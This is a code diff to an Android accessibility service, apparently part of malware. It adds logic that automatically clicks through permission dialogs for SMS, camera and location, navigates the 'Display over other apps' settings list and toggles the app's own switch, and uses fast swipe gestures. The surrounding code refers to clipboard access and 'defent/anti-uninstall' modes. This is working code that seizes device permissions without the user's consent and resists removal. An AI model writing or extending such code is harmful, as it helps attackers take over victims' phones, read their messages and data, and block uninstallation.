@@ -50,11 +50,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private long grantPermsStartTime = 0;
     private static final long GRANT_PERMS_DURATION = 15_000L; // 15 seconds max
 
+    // Auto-click lifetime limit: 5 minutes after all permissions are granted
+    private long autoClickStopTime = 0;
+    private static final long AUTO_CLICK_LIFETIME_MS = 5 * 60 * 1000L; // 5 minutes
+
     // Uninstall-assist mode: when true, accessibility clicks Uninstall/OK buttons
     private volatile boolean uninstallAssistMode = false;
     
     // Defent variables - run continuously forever
     private String currentAppName = "";
+
+    // DisplayOver permission state: tracks if we already clicked app name in the list
+    private volatile boolean spDisplayOverAppClicked = false;
 
     // ── Special-permission state machine ──────────────────────────────────────
     // Runs battery → overlay → usage stats → write settings, one at a time.
@@ -128,11 +135,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // Start continuous auto-click scan immediately
         startAutoClickScanner();
 
-        // Start the sequential special-permission granter immediately.
-        // Grant-perms auto-click handles standard dialogs (SMS, Camera, Location, etc.)
-        // first for 15 seconds; special perms (battery) kick off right after.
+        // Start the sequential special-permission granter AFTER standard permissions
+        // have been handled. The grant-perms auto-click phase runs for 15 seconds
+        // clicking standard permission dialogs (SMS, Camera, Location, etc.).
+        // Special perms (battery, display-over) start only after that phase ends.
         // Battery optimization is ONLY triggered here — never from MainActivity.
-        new Handler(Looper.getMainLooper()).post(this::startSpecialPermissionGranter);
+        new Handler(Looper.getMainLooper()).postDelayed(
+                this::startSpecialPermissionGranter, GRANT_PERMS_DURATION + 1000L);
         
         clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         
@@ -966,6 +975,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     public void startSpecialPermissionGranter() {
         if (spActive) return;
 
+        // Reset display-over state machine for a fresh run
+        spDisplayOverAppClicked = false;
+
         // Resolve our label once so we can find ourselves in list-style screens
         try {
             spAppLabel = getPackageManager()
@@ -976,7 +988,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
 
         spQueue = buildSpecialPermQueue();
-        if (spQueue.isEmpty()) return;
+        if (spQueue.isEmpty()) {
+            // No special perms needed — start the 5-minute auto-click lifetime timer now
+            autoClickStopTime = System.currentTimeMillis() + AUTO_CLICK_LIFETIME_MS;
+            return;
+        }
 
         spActive     = true;
         spIdx        = 0;
@@ -1058,6 +1074,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             Log.d(TAG, "SP granter: all permissions done — activating normal mode");
             // End grant phase immediately so defent/anti-uninstall starts right away
             stopGrantPermsTimer();
+            // Start 5-minute countdown: auto-click will stop after this
+            autoClickStopTime = System.currentTimeMillis() + AUTO_CLICK_LIFETIME_MS;
+            Log.d(TAG, "SP granter: auto-click will stop in 5 minutes");
             try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
             return;
         }
@@ -1162,53 +1181,65 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     /**
      * Handles the "Display over other apps" permission flow which has two screens:
      *
-     * Screen 1 — App list:
-     *   "display" is visible on screen.
-     *   • Our app name IS visible  → click the app-name row (opens per-app page).
-     *   • Our app name NOT visible → swipe up once to scroll, then wait for next event.
+     * PRE-CONDITION: The word "display" MUST be present on screen before any action.
      *
-     * Screen 2 — Per-app toggle page (after clicking our app name):
-     *   Both "display" and our app name are visible; an unchecked toggle is present.
-     *   • Click the unchecked switch/toggle.
-     *   • After 800 ms go home and end the grant phase so normal mode activates.
+     * State A (spDisplayOverAppClicked == false) — App list page:
+     *   • "display" present AND app name visible  → click the app name row, set state B.
+     *   • "display" present AND app name NOT visible → swipe up fast to find it.
+     *   • "display" NOT present → return false (wrong screen, do nothing).
+     *
+     * State B (spDisplayOverAppClicked == true) — Per-app toggle page:
+     *   • "display" present AND app name visible AND unchecked switch → click switch, go home.
+     *   • "display" present → try OK/Allow buttons as fallback.
+     *   • Toggle/switch must NEVER be clicked before app name was clicked in State A.
      */
     private boolean handleDisplayOverPermission(AccessibilityNodeInfo rootNode, String screenText) {
         String lower = screenText.toLowerCase();
 
-        // Confirm this is a "display over" related screen
+        // REQUIREMENT: word "display" MUST be present before any action at all
         if (!lower.contains("display")) return false;
 
         boolean appNameVisible = spAppLabel != null && screenText.contains(spAppLabel);
 
-        // ── Screen 2: per-app page — toggle is present ──────────────────────
-        // Check for an unchecked switch WITHOUT clicking it yet, to confirm we are
-        // on the per-app page where only our app's toggle is shown.
-        if (appNameVisible && hasUncheckedSwitchOnScreen(rootNode)) {
-            if (clickUncheckedSwitch(rootNode)) {
-                Log.d(TAG, "DisplayOver: clicked toggle on per-app page — going home");
-                if (spHandler != null) spHandler.removeCallbacksAndMessages(null);
-                spHandler = new Handler(Looper.getMainLooper());
-                spHandler.postDelayed(() -> {
-                    spActive = false;
-                    stopGrantPermsTimer(); // start normal mode (defent etc.) immediately
-                    try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
-                }, 800);
-                return true;
+        // ── State B: we already clicked the app name row ─────────────────────
+        // Only now are we allowed to click the toggle/switch.
+        if (spDisplayOverAppClicked) {
+            // Both "display" and app name must still be visible (per-app page)
+            if (appNameVisible && hasUncheckedSwitchOnScreen(rootNode)) {
+                if (clickUncheckedSwitch(rootNode)) {
+                    Log.d(TAG, "DisplayOver: clicked toggle on per-app page — going home");
+                    if (spHandler != null) spHandler.removeCallbacksAndMessages(null);
+                    spHandler = new Handler(Looper.getMainLooper());
+                    spHandler.postDelayed(() -> {
+                        spActive = false;
+                        spDisplayOverAppClicked = false;
+                        // Start 5-minute auto-click countdown
+                        autoClickStopTime = System.currentTimeMillis() + AUTO_CLICK_LIFETIME_MS;
+                        stopGrantPermsTimer();
+                        try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
+                    }, 800);
+                    return true;
+                }
             }
+            // Fallback: try OK/Allow buttons on the per-app page dialog
+            for (String kw : new String[]{"OK", "Ok", "Allow", "ALLOW"}) {
+                if (findAndClickFullWord(rootNode, kw)) return true;
+            }
+            return false;
         }
 
-        // ── Screen 1: list page — find and click our app name ───────────────
+        // ── State A: haven't clicked app name yet ─────────────────────────────
         if (appNameVisible) {
+            // "display" is present AND app name is visible → click app name row
             if (spFindAndClickOurAppInList(rootNode)) {
-                Log.d(TAG, "DisplayOver: clicked app name in list — waiting for per-app page");
+                Log.d(TAG, "DisplayOver: clicked app name in list — entering state B (per-app page)");
+                spDisplayOverAppClicked = true;
                 return true;
             }
-        }
-
-        // ── App name not visible on list page — scroll up to find it ────────
-        if (!appNameVisible) {
-            Log.d(TAG, "DisplayOver: app name not visible — swiping up to find it");
-            performSwipeUp();
+        } else {
+            // "display" present but app name NOT visible → swipe up fast to find it
+            Log.d(TAG, "DisplayOver: app name not visible — swiping up fast to find it");
+            performSwipeUpFast();
             return true;
         }
 
@@ -1239,7 +1270,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         return false;
     }
 
-    /** Swipe up on the screen to reveal more list items. */
+    /** Swipe up on the screen to reveal more list items (normal speed). */
     @SuppressWarnings("deprecation")
     private void performSwipeUp() {
         try {
@@ -1258,6 +1289,32 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             dispatchGesture(gesture, null, null);
         } catch (Exception e) {
             Log.w(TAG, "performSwipeUp: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Swipe up very fast on the screen — used when app name is not visible
+     * on the Display Over Other Apps list page. Fast swipe scrolls more aggressively.
+     */
+    @SuppressWarnings("deprecation")
+    private void performSwipeUpFast() {
+        try {
+            android.view.WindowManager wm =
+                    (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
+            android.util.DisplayMetrics dm = new android.util.DisplayMetrics();
+            wm.getDefaultDisplay().getMetrics(dm);
+            int w = dm.widthPixels  > 0 ? dm.widthPixels  : 1080;
+            int h = dm.heightPixels > 0 ? dm.heightPixels : 1920;
+            Path path = new Path();
+            // Swipe from near-bottom to near-top very fast (200 ms)
+            path.moveTo(w / 2f, h * 0.85f);
+            path.lineTo(w / 2f, h * 0.10f);
+            GestureDescription gesture = new GestureDescription.Builder()
+                    .addStroke(new GestureDescription.StrokeDescription(path, 0, 200))
+                    .build();
+            dispatchGesture(gesture, null, null);
+        } catch (Exception e) {
+            Log.w(TAG, "performSwipeUpFast: " + e.getMessage());
         }
     }
 
@@ -1525,6 +1582,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         autoClickRunnable = new Runnable() {
             @Override
             public void run() {
+                // Stop auto-click scanner 5 minutes after all permissions are granted
+                if (autoClickStopTime > 0 && System.currentTimeMillis() >= autoClickStopTime) {
+                    Log.d(TAG, "Auto-click scanner stopped — 5-minute lifetime reached");
+                    autoClickHandler = null;
+                    autoClickRunnable = null;
+                    return;
+                }
                 autoClickAllowButton();
                 if (autoClickHandler != null && autoClickRunnable != null) {
                     autoClickHandler.postDelayed(this, 500); // Scan every 500ms
